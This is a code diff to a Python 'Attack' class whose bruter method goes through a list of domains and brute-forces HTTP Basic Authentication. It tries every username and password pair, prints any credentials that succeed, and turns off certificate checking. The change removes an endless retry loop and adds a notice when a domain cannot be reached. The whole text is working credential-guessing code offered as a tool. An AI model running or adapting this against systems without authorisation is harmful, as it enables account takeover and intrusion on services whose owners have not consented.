@@ -68,33 +68,31 @@ class Attack:
         self.bruter(self.domains, self.users, self.passwords, self.args.v)
                                 
     def bruter(self, url, users, passwords, verbose):
-        while True:
-            try:
-                for url in self.domains:
-                    #pdb.set_trace()
-                    try:
-                        r = requests.get(url, verify=ssl.CERT_NONE)
-                    except requests.ConnectionError:
-                        continue
-                    self.status = False
-                    if r.status_code == 401:
-                        for user in users:
-                            for passw in passwords:
-                                resp = requests.get(url, auth = HTTPBasicAuth(username=user, password=passw), verify=ssl.CERT_NONE)
-                                if (resp.status_code == 200):
-                                    print(Fore.GREEN + "[+]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
-                                    self.status = True
-                                    break
-                                elif(verbose == True):
-                                    print(Fore.RED + "[-]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
-                            if self.status == True:
+        try:
+            for url in self.domains:
+                #pdb.set_trace()
+                try:
+                    r = requests.get(url, verify=ssl.CERT_NONE)
+                except requests.exceptions.ConnectionError:
+                    print("{} address could not be reached at the moment. If you are browsing with a domain list, please remove the unreachable domains from your list for the health of the program.".format(url))
+                    continue
+                self.status = False
+                if r.status_code == 401:
+                    for user in users:
+                        for passw in passwords:
+                            resp = requests.get(url, auth = HTTPBasicAuth(username=user, password=passw), verify=ssl.CERT_NONE)
+                            if (resp.status_code == 200):
+                                print(Fore.GREEN + "[+]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
+                                self.status = True
                                 break
-                    elif(verbose==True):
-                        print(Fore.RED + "[-]" + Style.RESET_ALL + " There is no HTTPBasicAuth at the {} address".format(url))
-            except requests.exceptions.SSLError:
-                print("ssl")
-            except requests.exceptions.ConnectionError:
-                pass
+                            elif(verbose == True):
+                                print(Fore.RED + "[-]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
+                        if self.status == True:
+                            break
+                elif(verbose==True):
+                    print(Fore.RED + "[-]" + Style.RESET_ALL + " There is no HTTPBasicAuth at the {} address".format(url))
+        except requests.exceptions.SSLError:
+            print("ssl")
 
 if __name__ == '__main__':
     try:
